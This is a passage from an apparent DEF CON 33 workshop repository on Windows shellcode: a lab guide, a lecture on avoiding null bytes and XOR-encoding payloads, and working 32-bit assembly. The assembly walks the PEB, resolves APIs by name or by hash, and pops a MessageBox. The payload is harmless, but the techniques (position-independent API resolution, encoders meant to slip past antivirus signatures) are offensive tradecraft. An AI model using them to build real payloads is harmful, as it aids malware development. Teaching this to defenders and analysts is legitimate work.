  INC EAX
  RET ; This shouldn't be reached if ExitProcess is called.

; --- Shellcode End ---

; --- Data/String section ---
section .data
    string_ExitProcess: db 'ExitProcess', 0 ; Problematic null byte! Need to avoid.
    string_kernel32_dll: dw 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 ; Problematic null byte! Need to avoid.
    string_getprocaddress: db 'GetProcAddress', 0
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/lab.md`

````markdown
# Rolling Your Own Shellcode

## Write a MessageBox Shellcode

### Step 1
As you've seen from previous analysis, there are a lot of assembly instructions to get right before the shellcode can work. To start writing our MessageBox shellcode, we're going to make use of the `skeleton.asm` file. This file has a lot of details filled in but other parts that you will need to fill out.

The first task is that we need to know where we are in memory. To do that, we'll use the technique we learned to retrieve EIP or the Program Counter. When you get it, make sure to take notice of the actual value, it may be slightly off from what you need....

Hint: CALL places the __return__ address on the stack that we `POP` into a register

Hint 2: When you're adjusting the value, make sure to account for the instructions that you are using to adjust the value. If you don't you'll run into a chicken-and-egg problem of every instruction to adjust the value causes the value to be wrong by a small amount.

### Step 2

The next step is to get the address of the PEB. There is a hint in the skeleton.asm file that you can use to fill out the instruction.

### Step 3

The next step will be figuring out the string comparison for your shellcode. This is one of the trickiest parts because you either need to write code to compare the bytes or compare hashes. Either option is fine based on what you want to do. We will discuss hashing a little later in this lab as well.

### Step 4

Using your knowledge and ability to find information about windows internals, find out where the beginning of the data directory array is located in the PE file. You need to update an `ADD EAX, ???` instruction with this value to continue execution of your shellcode.

### Step 5

Fill in the values needed to find the RVAs for the AddressOfNames, AddressOfNameOrdinals, and AddressOfFunction tables. There are hints in the skeleton to help you fill in these values.

### Step 6

Implement the same, or another version, of string comparison for dynamically resolving GetProcAddress so we can use it to resolve other functions.

### Step 7

Convert the string "ExitProcess" to a sequence of PUSH instructions with constant values. Remember, each character can be represented with a byte and Intel is a little-endian architecture.

## Hashing Win API Function Names

### Assembly Side

Now it's time to put that WinAPIHash.py script to good use. We can use this to generate hashes using our unique key and our function names to allow for Windows API look up without the function strings in our shellcode.

Here is the skeleton of the hashing function routine to use in your shellcode.

```asm
hash_func:
  ; Expecting values to be in ESI and EDI
  ; ESI - DWORD hash
  ; EDI - function name to be hashed
  ; ECX - Number of bytes
  ; Have ESP + 0, + 4, +8 to hold variables
  ; + 8 = original EDI pointer
  ; + 4 = loop count
  ; + 0 = temporary storage
  PUSH EBP
  MOV EBP, ESP
  SUB ESP, 0xC
  MOV [ESP+8], EDI  ; Store original value
  XOR EAX, EAX
  MOV [ESP+4], EAX  ; Set counter to 0
loop:
  MOV [ESP], EAX  ; Store EAX for a moment
  MOVZX EAX, byte [EDI]  ; Get byte into EAX
  TODO ; Add to previous value
  TODO ; Shift left
  TODO  ; Increment pointer
  TODO  ; Increment counter
  TODO  ; Check if we've reached the end
  JL loop
  XOR EAX, TODO  ; Unique Key
  TODO  ; Set return value, could be bool or DWORD hash
  MOV EDI, [ESP+8]  ; Restore original value
  ADD ESP, 0xC
  POP EBP
  RET
```

You will have to fill in the gaps and use it within your shellcode to hash the function names and compare them in order to determine if you've found the right one. Make sure you pay attention to ASCII vs. Wide Character strings!

When you've completed the shellcode, assemble it using Nasm to create a .bin file.

### Python Side

Now that you've completed making the encoder .bin file, copy these bytes into the your XOREncode_skeleton.py inside the XOR_DECODER_STUB global variable so it can be prepended to the encoded shellcode.

Now you have to fill in the rest of the Python XOR encoder script!

There are two main tasks to finishing this script:

1. XOR encode each of the bytes of the shellcode payload.
2. Include the size of the payload so the DECODER knows where to stop decoding.

For the first task, you'll need to lookup the python syntax for the XOR operation and implement it within your skeleton .py

For the second part, there is more flexibility. The solution to this part of the lab may change depending on how you implemented it in the xor_decode_skeleton.asm.

These instructions If you followed the instructions in the xor_decode_skeleton.asm, then there are three steps to implementing the size component for this encoder.

1. You need to get the size of the shellcode payload
2. You need to XOR it with whatever special key you're using in the xor_decode_skeleton.asm (by default it was 0xAABBCCDD)
3. You need to replace 0xFFEEDDCC with the encoded size in the XOR_DECODER_STUB array.

### Ready To Go?

You should now have all the parts you need to run your encoded payload! Encode your payload and run it using the ShellcodeHarness and make sure it still works.

If your shellcode is not working, it's time to fire up the debugger and step through the execution to figure out what went wrong.

\pagebreak
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/lecture.md`

````markdown
# Rolling Your Own Shellcode

## Removing bad characters

### Substituting instructions

One of the most common substitutions is for setting values equal to zero. You can absolutely use `MOV EAX, 0x0` and this will assign the EAX register to be zero. However, this will contain at least one null byte because of the constant 0x0 being present in the instruction.

A common trick to avoid this is to XOR a register with itself, `XOR EAX, EAX`. Any value XOR'd with itself is 0; the XOR operation just has this mathematical property. 

It natually follows from this that any small value that you need can be created by XOR-ing a register and then incrementing the register until you get the value you need. However, at some point, there is a tradeoff between the number of `INC` calls you need and the actual value you need.

Again, for small values, you can use `LEA` as another tactic. `LEA` stands for Load Effective Address. It has some weird usage, but any single byte value can be used like the following to get a byte into a register.

```asm
XOR EAX, EAX
LEA EAX, [EAX+0x45]
```

This will place the byte 0x45 into the EAX register. This works because we zero out the EAX register and then we add 0x45 to EAX, which is zero, to create an "address" of 0x45. We then move that value into EAX for storage.

This leads into our next subsection, arithmetic construction of values.

### Arithmetic construction

Building on our previous example, we can repeat that LEA technique to fill in a register using `LEA` and the `SHL` instruction. The `SHL` instruction shifts a value to the left by the number of bits specified as an argument. Given that each DWORD is 32bits, and each byte takes up 8 bits. We can create any DWORD following this trick.

```asm
XOR EAX, EAX
LEA EAX, [EAX+0x12]
SHL EAX, 8
LEA EAX, [EAX+0x34]
SHL EAX, 8
LEA EAX, [EAX+0x56]
SHL EAX, 8
LEA EAX, [EAX+0x78]
```

This will place the value, 0x12345678 into EAX with no null bytes.

We can also use AND, OR, NOT, NEG, and XOR to create values in any register without using null bytes. We can also use math operations like ADD, SUB, MUL, and DIV to get us the numbers we need too. This requires a bit of pre-computation before putting the values in your shellcode, but once you have them the operation will run correctly and produce your value. Let's say we need a value that has a null byte in it, we can use math to create it.

Let's create 'cmd.exe\0' using math. Unfortunately we can see that this will require a null byte. Since those are not allowed for this example, we need a way to compute it instead of passing it in.

'cmd.' is 0x63 0x6d 0x64 0x2e in hexadecimal and in little endian we get the hex constant 0x2e646d63. Let's use XOR to compute this. We can get 0xFFFFFFFF from `XOR EAX, EAX` followed by a `DEC EAX`. Then we can use a constant, 0xd19b929c, which also has no null bytes. When we XOR -1 and our new constant, we get our desired hex value.

Now we need our hex constant that has a null value, 0x00657865. We can take advantage of knowing that the opposite (or NEG) of 0x00 is 0xFF. We can then use 0xFF9A879A, which is null free, and call the NEG instruction on the register that holds it to compute our value. 

Lastly, we will want these values on the stack so we can use the string as an argument to a function call. An example might look something like this:

```asm
MOV EAX, 0xFF9A879A
NEG EAX
PUSH EAX
XOR EAX, EAX
DEC EAX
XOR EAX, 0xd19b929c
PUSH EAX
```

The possibilities to compute values are unlimited and rely only on your creativity and the restricted characters for your shellcode.

### Using encoders

Lastly, we come to encoders. This is the more progammatic way to solve the issue. What if we had a stub of code that could just decode all of our code? We could give it a key and that key would allow the encoder to do all of the decoding in memory. We wouldn't need to manually compute values or instructions, we simply write our code and then encoded it and prepend a stub that decodes it to the shellcode.

Encoders can be a little tricky as they are often targeted by Antivirus companies because they themselves cannot be encoded. This means they are a prime target for signature based detection. 

One of the most famous encoders when first learning about shellcode is the shikata ga nai encoder included in Metasploit. This is polymorphic XOR additive feedback encoder. In other words, it uses XOR and addition of values to compute the key which feeds into the decoding process. This makes it difficult to decrypt with a static key but once the algorithm is known by an analyst it can be trivially decoded.

For this course, we'll do a simple XOR encoder to demonstrate the technique. The idea is that every byte in the payload will be XOR encoded with a specific value. This will obfuscate the bytes and potentially eliminate any null bytes. However, there is a chance that the byte used as the key is present in the shellcode and thus would make a new null byte. This problem can be solved with multiple encodings or selecting a key that is not used anywhere in the shellcode.

First, we're going to need a python script to do the XOR encoding for us and we'll have it select a key that's not used in the shellcode (if possible). Then we'll write our XOR decoder stub. Finally, we'll put it all together and have it take in our shellcode and spit out an encoded shellcode for us.

Use the XOREncode_skeleton.py and the xor_decode.asm files to complete this activity. You will need to fill in the missing functionality for the python script and assemble the xor decoder in order to get the bytes to prepend to the shellcode.
````

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/messagebox32.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; --- Shellcode Start ---
; --- 0. Get current location ---
call get_eip
get_eip:
    POP EDX  ; For now, EDX holds the starting location of shellcode
    SUB EDX, 0x5  ; Set EDX to beginning of shellcode

; --- 1. Get the address of the PEB ---
; In 32-bit Windows, the PEB is typically pointed to by FS:[0x30].
MOV EAX, FS:[0x30] ; EAX = Address of the PEB

; --- 2. Traverse the PEB's module list to find kernel32.dll ---
; PEB structure (simplified):
; +0x00 ...
; +0x0C Ldr (Pointer to PEB_LDR_DATA)
; ...
; PEB_LDR_DATA structure (simplified):
; +0x0C InLoadOrderModuleList (LIST_ENTRY) - This list is often used
; +0x14 InMemoryOrderModuleList (LIST_ENTRY)
; +0x1C InInitializationOrderModuleList (LIST_ENTRY)
; ...
; LDR_DATA_TABLE_ENTRY structure (simplified):
; +0x00 InLoadOrderLinks (LIST_ENTRY)
; +0x08 InMemoryOrderLinks (LIST_ENTRY)
; +0x10 InInitializationOrderLinks (LIST_ENTRY)
; +0x18 DllBase (Base address of the module)
; +0x2C BaseDllName (UNICODE_STRING structure) - Pointer to module name

MOV EAX, [EAX + 0x0C] ; EAX = Address of PEB_LDR_DATA (PEB->Ldr)

; We'll use the InMemoryOrderModuleList (offset 0x14 from PEB_LDR_DATA).
; The LIST_ENTRY structure has Flink (ForwardLink) and Blink (BackwardLink) pointers.
; The first entry after the list head is the first module (usually the main EXE).
; The second entry is typically ntdll.dll, the third is kernel32.dll.
MOV EAX, [EAX + 0x14] ; EAX = Address of the InMemoryOrderModuleList LIST_ENTRY (list head)
MOV ECX, EAX          ; ECX = Pointer to the list head for comparison later

; Get the address of the first entry (the EXE itself)
MOV ESI, [EAX]        ; ESI = Flink of the list head (first LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks)

; Start loop to walk the list
find_kernel32_loop:
  ; Check if we've wrapped around to the list head (end of list)
  CMP ESI, ECX
  JE end_of_module_list ; If ESI equals ECX, we've checked all modules

  ; ESI currently points to the InMemoryOrderLinks field (offset 0x08)
  ; of the LDR_DATA_TABLE_ENTRY.
  ; To get the base address and name, we need the base address of the LDR_DATA_TABLE_ENTRY.
  ; The InMemoryOrderLinks field is at offset +0x08 within the LDR_DATA_TABLE_ENTRY.
  ; So, Base address of entry = ESI - 0x08
  PUSH ESI            ; Save ESI (points to InMemoryOrderLinks)
  SUB ESI, 0x08       ; ESI = Base address of the current LDR_DATA_TABLE_ENTRY

  ; Get the module base address
  MOV EBX, [ESI + 0x18] ; EBX = DllBase (Module base address)

  ; Get the UNICODE_STRING structure for the module name
  LEA EDI, [ESI + 0x2C] ; EDI = Address of UNICODE_STRING structure (BaseDllName)
  ; The UNICODE_STRING structure (simplified):
  ; +0x00 Length
  ; +0x02 MaximumLength
  ; +0x04 Buffer (Pointer to the wide character string)

  MOV EDI, [EDI + 0x04] ; EDI = Pointer to the module name wide string (BaseDllName.Buffer)

  ; This is where string comparison logic goes.
  ; In real shellcode, this would be an assembly routine
  ; comparing the wide string at EDI with a hardcoded hash
  ; of "kernel32.dll" or doing a manual character-by-character
  ; comparison avoiding null bytes.
  PUSH EDI  ; Save EDI
  PUSH ESI  ; Save ESI
  PUSH ECX  ; Save ECX
  MOV ECX, 0xd  ; Move length of string into ECX for REP CMPSW instruction

  ; We are going to use the `repe cmpsw` instruction to compare our kernel32 string
  ; with the one in the buffer. If they are not equal we continue the loop, otherwise
  ; we found the module. We use the W variant because kernel32 is a wide char.
  LEA ESI, [string_kernel32_dll]
  ADD ESI, EDX  ; Get memory correct location of kernel32 string
  REPE CMPSW
  je found_kernel32  ; If the strings were equal, we found it, otherwise reset and try again

  POP ECX  ; Restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value
  POP ESI              ; Restore ESI (get back the Flink pointer)
  MOV ESI, [ESI]       ; ESI = Flink to the next entry in the list
  JMP find_kernel32_loop ; Continue loop

end_of_module_list:
  ; Handle case where kernel32.dll was not found (shellcode should probably exit)
  JMP shellcode_exit_failure ; Example exit path

found_kernel32:
  ; EBX now holds the base address of kernel32.dll
  POP ECX  ; restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value

  ; --- 3. Parse the PE headers of kernel32.dll to find the Export Directory ---
  ; MZ Header: +0x3C points to the PE Header (NT Headers) offset (e_lfanew)
  MOV EAX, [EBX + 0x3C]   ; EAX = RVA of NT Headers (PE Signature)
  ADD EAX, EBX            ; EAX = Address of NT Headers (PE Signature)

  ; NT Headers (simplified):
  ; +0x00 Signature ("PE\0\0")
  ; +0x04 IMAGE_FILE_HEADER
  ; +0x18 IMAGE_OPTIONAL_HEADER32 (Offset varies for 64-bit)
  ; ...
  ; IMAGE_OPTIONAL_HEADER32 (simplified):
  ; ...
  ; +0x78 DataDirectory (IMAGE_DATA_DIRECTORY array, size 16) - Offset 0x78 for 32-bit
  ; ...
  ; IMAGE_DATA_DIRECTORY structure:
  ; +0x00 VirtualAddress (RVA of the data structure)
  ; +0x04 Size

  ; Access the Optional Header (offset 0x18 from NT Headers + Signature size 4 = 0x1C)
  ; ADD EAX, 0x1C           ; EAX = Address of the IMAGE_OPTIONAL_HEADER32

  ; Access the Data Directory array (offset 0x78 from start of Optional Header32)
  ADD EAX, 0x78           ; EAX = Address of the DataDirectory array

  ; The Export Directory is the first entry in the Data Directory array (index 0)
  MOV ESI, [EAX]          ; ESI = RVA of the Export Directory
  ADD ESI, EBX            ; ESI = Address of the Export Directory structure

  ; Export Directory structure (simplified):
  ; ...
  ; +0x14 NumberOfNames (Number of exported functions with names)
  ; +0x1C AddressOfFunctions (RVA of Export Address Table - EAT)
  ; +0x20 AddressOfNames (RVA of Export Name Pointer Table - ENPT)
  ; +0x24 AddressOfNameOrdinals (RVA of Export Ordinal Table - EOT)
  ; ...

  ; Store EAX so we can use it to hold shellcode base
  PUSH EAX
  MOV EAX, EDX

  ; Get pointers to the key tables
  MOV EDI, [ESI + 0x20] ; EDI = RVA of AddressOfNames (ENPT)
  ADD EDI, EBX          ; EDI = Address of the ENPT (Array of RVAs of function names)

  MOV EBP, [ESI + 0x24] ; EBP = RVA of AddressOfNameOrdinals (EOT)
  ADD EBP, EBX          ; EBP = Address of the EOT (Array of WORDs - ordinals)
  
  MOV EDX, [ESI + 0x1C] ; EDX = RVA of AddressOfFunctions (EAT)
  ADD EDX, EBX          ; EDX = Address of the EAT (Array of DWORDs - functions)

  ; Get the number of named exports
  MOV ECX, [ESI + 0x14] ; ECX = NumberOfNames


  ; --- 4. Walk the Export Name Pointer Table to find GetProcAddress ---
  ; We need to iterate through the names and compare them to "GetProcAddress".

  find_GetProcAddress_loop:
    ; Check if we have iterated through all named exports
    DEC ECX               ; Decrement name counter
    JL end_of_GetProcAddress_loop ; If counter < 0, exit loop

    ; Get the RVA of the current function name string from the ENPT
    MOV ESI, [EDI + ECX * 4] ; ESI = RVA of the current function name string
    ADD ESI, EBX             ; ESI = Address of the current function name string

    ; --- Compare the string at ESI with "GetProcAddress" ---
    ; This is another string comparison routine.
    PUSH EDI  ; Save EDI
    PUSH ECX  ; Save number of function names
    MOV ECX, 0xe  ; Length of GetProcAddres
    LEA EDI, string_getprocaddress
    ADD EDI, EAX  ; EAX holds shellcode base for now 
    REPE CMPSB
    JE found_GetProcAddress  ; If the strings were equal, we found it, otherwise reset and try again
    POP ECX  ; Restore ECX
    POP EDI  ; Restore EDI

    ; If no match, continue loop
    JMP find_GetProcAddress_loop

  end_of_GetProcAddress_loop:
    ; Handle case where GetProcAddress was not found
    JMP shellcode_exit_failure ; Example exit path

  found_GetProcAddress:
    POP ECX  ; Restore index of GetProcAddress
    POP EDI  ; Restore EDI from string comparison
    POP EAX  ; Restore EAX from before and reset stack

    ; ECX holds the index of "GetProcAddress" from the successful comparison
    ; Use this index to find the ordinal
    MOVZX ECX, WORD [EBP + ECX * 2] ; ECX = Ordinal (ordinals array is WORDs)

    ; Use the ordinal to find the function RVA in the EAT
    MOV EAX, [EDX + ECX * 4] ; EAX = RVA of the function (EAT is DWORDs)

    ; Calculate the absolute address of GetProcAddress
    ADD EAX, EBX             ; EAX = Address of GetProcAddress
    MOV EDI, EAX             ; EDI now holds the address of GetProcAddress

; --- 5. Use the found address of GetProcAddress to find LoadLibraryA ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "LoadLibraryA")
  ; Push the function name "LoadLibraryA" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "LoadLibraryA\x00":
  PUSH 0  ; Null terminating char
  PUSH 0x41797261  ; Ayra
  PUSH 0x7262694c  ; rbiL
  PUSH 0x64616f4c  ; daoL
  MOV ESI, ESP     ; ESI = Pointer to "LoadLibrary" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "LoadLibraryA")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of LoadLibraryA
  MOV EDX, EAX  ; Store LoadLibraryA in EDX for later use

  ; --- Call LoadLibraryA ---
  ; MessageBoxA takes one argument. We want to load User32.dll 
  ; We need to create the string on the stack
  PUSH 0x00006c6c  ; \0\0ll
  PUSH 0x642e3233  ; d.23
  PUSH 0x52455355  ; RESU
  MOV ESI, ESP  ; Store "Hello" string in ESI
  PUSH ESI         ; Push string for user32.dll on the stack

  ; Call (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (LoadLibraryA)

  ; EAX now holds the base address of User32.dll

  ; Prepare arguments for GetProcAddress("user32.dll", "MessageBoxA")
  ; Push the function name "MessageBoxA" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "MessageBoxA\x00":
  PUSH 0x0041786f  ; \0Axo
  PUSH 0x42656761  ; Bega
  PUSH 0x7373654d  ; sseM
  MOV ESI, ESP     ; ESI = Pointer to "MessageBoxA" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "MessageBoxA")
  PUSH EAX         ; Push base address of user32.dll
  
  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of MessageBoxA

  ; --- Call MessageBoxA ---
  ; MessageBoxA takes four arguments. 
  ; We need to create more strings on the stack
  PUSH 0x0000006f  ; \0\0\0o
  PUSH 0x6c6c6568  ; lloH
  MOV ESI, ESP  ; Store "Hello" string in ESI
  PUSH 0           ; Push uType - type of msg box window
  PUSH ESI         ; Push lpCaption - Pointer to title string in msg box
  PUSH ESI         ; Push lpText - Pointer to text string in msg box
  PUSH 0           ; Push hWnd - Handle to window

  ; Call MessageBoxA (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (MessageBoxA)
  
  ; --- 6. Use the found address of GetProcAddress to find ExitProcess ---
  ; Now we can call GetProcAddress(hModule, lpProcName)
  ; Arguments are pushed onto the stack right-to-left (stdcall/cdecl compatible for a few args)

  ; Prepare arguments for GetProcAddress("kernel32.dll", "ExitProcess")
  ; Push the function name "ExitProcess" (as a string or hash ID)

  ; Example of pushing characters onto the stack to form "ExitProcess\x00":
  PUSH DWORD 0x00737365 ; "\0sse"
  PUSH DWORD 0x636F7250 ; "corP"
  PUSH DWORD 0x74697845 ; "tixE"
  MOV ESI, ESP     ; ESI = Pointer to "ExitProcess" string on stack

  ; Push the pointer to the function name string
  PUSH ESI         ; Push lpProcName (pointer to "ExitProcess")
  
  ; Push kernel32.dll base address
  PUSH EBX         ; Push hModule (kernel32.dll base address is in EBX)

  ; Call GetProcAddress
  CALL EDI         ; Call the address stored in EDI (GetProcAddress)

  ; EAX now holds the address of ExitProcess

  ; --- Call ExitProcess ---
  ; ExitProcess takes one argument: uExitCode (DWORD)
  PUSH 0           ; Push exit code 0

  ; Call ExitProcess (address is in EAX)
  CALL EAX         ; Call the address stored in EAX (ExitProcess)


shellcode_exit_failure:
  ; Code to indicate failure, EAX=1
  XOR EAX, EAX
  INC EAX
  RET ; This shouldn't be reached if ExitProcess is called.

; --- Shellcode End ---

; --- Data/String section ---
section .data
    string_getprocaddress: db 'GetProcAddress', 0
    string_kernel32_dll: dw 'K', 'E', 'R', 'N', 'E', 'L', '3', '2', '.', 'D', 'L', 'L', 0 ; Problematic null byte! Need to avoid.
```

### `DEF CON 33 - Workshops - Bramwell Brizendine - Analyzing and Creating Windows Shellcode for Hackers - Full Workshop/4Rolling_Your_Own_Shellcode/messagebox32_hashing.asm`

```asm
; Assemble: nasm -o exitprocess32.bin exitprocess32.asm
BITS 32  ; Set to 32-bit mode

SECTION .text

global _start

_start:
; --- Shellcode Start ---
; --- 0. Get current location ---
call get_eip
get_eip:
    POP EDX  ; For now, EDX holds the starting location of shellcode
    SUB EDX, 0x5  ; Set EDX to beginning of shellcode

; --- 1. Get the address of the PEB ---
; In 32-bit Windows, the PEB is typically pointed to by FS:[0x30].
MOV EAX, FS:[0x30] ; EAX = Address of the PEB

; --- 2. Traverse the PEB's module list to find kernel32.dll ---
; PEB structure (simplified):
; +0x00 ...
; +0x0C Ldr (Pointer to PEB_LDR_DATA)
; ...
; PEB_LDR_DATA structure (simplified):
; +0x0C InLoadOrderModuleList (LIST_ENTRY) - This list is often used
; +0x14 InMemoryOrderModuleList (LIST_ENTRY)
; +0x1C InInitializationOrderModuleList (LIST_ENTRY)
; ...
; LDR_DATA_TABLE_ENTRY structure (simplified):
; +0x00 InLoadOrderLinks (LIST_ENTRY)
; +0x08 InMemoryOrderLinks (LIST_ENTRY)
; +0x10 InInitializationOrderLinks (LIST_ENTRY)
; +0x18 DllBase (Base address of the module)
; +0x2C BaseDllName (UNICODE_STRING structure) - Pointer to module name

MOV EAX, [EAX + 0x0C] ; EAX = Address of PEB_LDR_DATA (PEB->Ldr)

; We'll use the InMemoryOrderModuleList (offset 0x14 from PEB_LDR_DATA).
; The LIST_ENTRY structure has Flink (ForwardLink) and Blink (BackwardLink) pointers.
; The first entry after the list head is the first module (usually the main EXE).
; The second entry is typically ntdll.dll, the third is kernel32.dll.
MOV EAX, [EAX + 0x14] ; EAX = Address of the InMemoryOrderModuleList LIST_ENTRY (list head)
MOV ECX, EAX          ; ECX = Pointer to the list head for comparison later

; Get the address of the first entry (the EXE itself)
MOV ESI, [EAX]        ; ESI = Flink of the list head (first LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks)

; Start loop to walk the list
find_kernel32_loop:
  ; Check if we've wrapped around to the list head (end of list)
  CMP ESI, ECX
  JE end_of_module_list ; If ESI equals ECX, we've checked all modules

  ; ESI currently points to the InMemoryOrderLinks field (offset 0x08)
  ; of the LDR_DATA_TABLE_ENTRY.
  ; To get the base address and name, we need the base address of the LDR_DATA_TABLE_ENTRY.
  ; The InMemoryOrderLinks field is at offset +0x08 within the LDR_DATA_TABLE_ENTRY.
  ; So, Base address of entry = ESI - 0x08
  PUSH ESI            ; Save ESI (points to InMemoryOrderLinks)
  SUB ESI, 0x08       ; ESI = Base address of the current LDR_DATA_TABLE_ENTRY

  ; Get the module base address
  MOV EBX, [ESI + 0x18] ; EBX = DllBase (Module base address)

  ; Get the UNICODE_STRING structure for the module name
  LEA EDI, [ESI + 0x2C] ; EDI = Address of UNICODE_STRING structure (BaseDllName)
  ; The UNICODE_STRING structure (simplified):
  ; +0x00 Length
  ; +0x02 MaximumLength
  ; +0x04 Buffer (Pointer to the wide character string)

  MOV EDI, [EDI + 0x04] ; EDI = Pointer to the module name wide string (BaseDllName.Buffer)

  ; This is where string comparison logic goes.
  ; In real shellcode, this would be an assembly routine
  ; comparing the wide string at EDI with a hardcoded hash
  ; of "kernel32.dll" or doing a manual character-by-character
  ; comparison avoiding null bytes.
  PUSH EDI  ; Save EDI
  PUSH ESI  ; Save ESI
  PUSH ECX  ; Save ECX
  
  ; There seems to be an issue MOV-ing 0x1a into ECX, working around it
  MOV ECX, 0x18 ; Move length of string in bytes into ECX for hash_func

  ; We are going to use the `repe cmpsw` instruction to compare our kernel32 string
  ; with the one in the buffer. If they are not equal we continue the loop, otherwise
  ; we found the module. We use the W variant because kernel32 is a wide char.
  MOV ESI, 0x556E7F44  ; Hash of KERNEL32.DLL wide-char
  CALL hash_func
  TEST EAX, EAX
  je found_kernel32  ; If the strings were equal, we found it, otherwise reset and try again

  POP ECX  ; Restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value
  POP ESI              ; Restore ESI (get back the Flink pointer)
  MOV ESI, [ESI]       ; ESI = Flink to the next entry in the list
  JMP find_kernel32_loop ; Continue loop

end_of_module_list:
  ; Handle case where kernel32.dll was not found (shellcode should probably exit)
  JMP shellcode_exit_failure ; Example exit path

found_kernel32:
  ; EBX now holds the base address of kernel32.dll
  POP ECX  ; restore saved value
  POP ESI  ; Restore saved value
  POP EDI  ; Restore saved value

  ; --- 3. Parse the PE headers of kernel32.dll to find the Export Directory ---
  ; MZ Header: +0x3C points to the PE Header (NT Headers) offset (e_lfanew)
  MOV EAX, [EBX + 0x3C]   ; EAX = RVA of NT Headers (PE Signature)
  ADD EAX, EBX            ; EAX = Address of NT Headers (PE Signature)

  ; NT Headers (simplified):
  ; +0x00 Signature ("PE\0\0")
  ; +0x04 IMAGE_FILE_HEADER
  ; +0x18 IMAGE_OPTIONAL_HEADER32 (Offset varies for 64-bit)
  ; ...
  ; IMAGE_OPTIONAL_HEADER32 (simplified):
  ; ...
  ; +0x78 DataDirectory (IMAGE_DATA_DIRECTORY array, size 16) - Offset 0x78 for 32-bit
  ; ...
  ; IMAGE_DATA_DIRECTORY structure:
  ; +0x00 VirtualAddress (RVA of the data structure)
  ; +0x04 Size

  ; Access the Optional Header (offset 0x18 from NT Headers + Signature size 4 = 0x1C)
  ; ADD EAX, 0x1C           ; EAX = Address of the IMAGE_OPTIONAL_HEADER32

  ; Access the Data Directory array (offset 0x78 from start of Optional Header32)
  ADD EAX, 0x78           ; EAX = Address of the DataDirectory array

  ; The Export Directory is the first entry in the Data Directory array (index 0)
  MOV ESI, [EAX]          ; ESI = RVA of the Export Directory
  ADD ESI, EBX            ; ESI = Address of the Export Directory structure

  ; Export Directory structure (simplified):
  ; ...
  ; +0x14 NumberOfNames (Number of exported functions with names)
  ; +0x1C AddressOfFunctions (RVA of Export Address Table - EAT)
  ; +0x20 AddressOfNames (RVA of Export Name Pointer Table - ENPT)
  ; +0x24 AddressOfNameOrdinals (RVA of Export Ordinal Table - EOT)
  ; ...

  ; Store EAX so we can use it to hold shellcode base
  PUSH EAX
  MOV EAX, EDX

  ; Get pointers to the key tables
  MOV EDI, [ESI + 0x20] ; EDI = RVA of AddressOfNames (ENPT)
  ADD EDI, EBX          ; EDI = Address of the ENPT (Array of RVAs of function names)

  MOV EBP, [ESI + 0x24] ; EBP = RVA of AddressOfNameOrdinals (EOT)
  ADD EBP, EBX          ; EBP = Address of the EOT (Array of WORDs - ordinals)
  
  MOV EDX, [ESI + 0x1C] ; EDX = RVA of AddressOfFunctions (EAT)
  ADD EDX, EBX          ; EDX = Address of the EAT (Array of DWORDs - functions)

  ; Get the number of named exports
  MOV ECX, [ESI + 0x14] ; ECX = NumberOfNames


  ; --- 4. Walk the Export Name Pointer Table to find GetProcAddress ---
  ; We need to iterate through the names and compare them to "GetProcAddress".

  find_GetProcAddress_loop:
    ; Check if we have iterated through all named exports
    DEC ECX               ; Decrement name counter
    JL end_of_GetProcAddress_loop ; If counter < 0, exit loop

    ; Get the RVA of the current function name string from the ENPT
    MOV ESI, [EDI + ECX * 4] ; ESI = RVA of the current function name string
    ADD ESI, EBX             ; ESI = Address of the current function name string

    ; --- Compare the string at ESI with "GetProcAddress" ---
    ; This is another string comparison routine.
    PUSH EDI  ; Save EDI
    MOV EDI, ESI
    PUSH ESI  ; Save ESI
    PUSH ECX  ; Save number of function names
    MOV ECX, 0xe  ; Length of GetProcAddres
    MOV ESI, 0x6b9af974  ; Hash of GetProcAddress
    CALL hash_func
    TEST EAX, EAX
    JE found_GetProcAddress  ; If the strings were equal, we found it, otherwise reset and try again
    POP ECX  ; Restore ECX
    POP ESI  ; Restore ESI
    POP EDI  ; Restore EDI

    ; If no match, continue loop
    JMP find_GetProcAddress_loop

  end_of_GetProcAddress_loop:
    ; Handle case where GetProcAddress was not found
    JMP shellcode_exit_failure ; Example exit path

  found_GetProcAddress:
    POP ECX  ; Restore index of GetProcAddress
    POP ESI  ; Restore ESI
    POP EDI  ; Restore EDI from string comparison
    POP EAX  ; Restore EAX from before and reset stack

    ; ECX holds the index of "GetProcAddress" from the successful comparison
    ; Use this index to find the ordinal
    MOVZX ECX, WORD [EBP + ECX * 2] ; ECX = Ordinal (ordinals array is WORDs)

    ; Use the ordinal to find the function RVA in the EAT
    MOV EAX, [EDX + ECX * 4] ; EAX = RVA of the function (EAT is DWORDs)

    ; Calculate the absolute address of GetProcAddress
    ADD EAX, EBX             ; EAX = Address of GetProcAddress
